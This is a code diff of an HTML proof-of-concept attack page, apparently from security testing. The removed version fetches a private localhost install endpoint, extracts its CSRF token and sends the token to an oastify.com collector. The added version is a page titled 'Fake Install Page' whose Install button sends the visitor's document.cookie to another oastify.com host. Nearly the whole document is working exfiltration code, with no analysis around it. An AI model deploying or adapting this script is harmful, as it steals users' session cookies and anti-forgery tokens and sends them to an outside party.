@@ -1,20 +1,19 @@
 <!DOCTYPE html>
 <html>
+<head>
+  <title>Fake Install Page</title>
+</head>
 <body>
-<script>
-fetch("http://localhost:3000/apiv1/private/install")
-  .then(res => res.text())
-  .then(html => {
-    // Try to extract CSRF token from HTML
-    const match = html.match(/name="csrfToken" value="([^"]+)"/);
-    const token = match ? match[1] : "no_token";
-    // Send token to your server
-    fetch("https://qe8wbhjtwtimmi0i3q6mpnxufllc96xv.oastify.com/log?csrf=" + encodeURIComponent(token));
-  })
-  .catch(e => {
-    // Even log error to your server to debug
-    fetch("https://qe8wbhjtwtimmi0i3q6mpnxufllc96xv.oastify.com/log?error=fetch_failed");
-  });
-</script>
+  <h2>Internal Tool Installer</h2>
+
+  <button id="installbutton" onclick="installApp()">Install</button>
+
+  <script>
+    function installApp() {
+      // XSS logic after button click
+      const cookie = document.cookie;
+      fetch('https://gdxma7ijvjhcl8z82g5codwkebk28xwm.oastify.com/?cookie=' + encodeURIComponent(cookie));
+    }
+  </script>
 </body>
 </html>
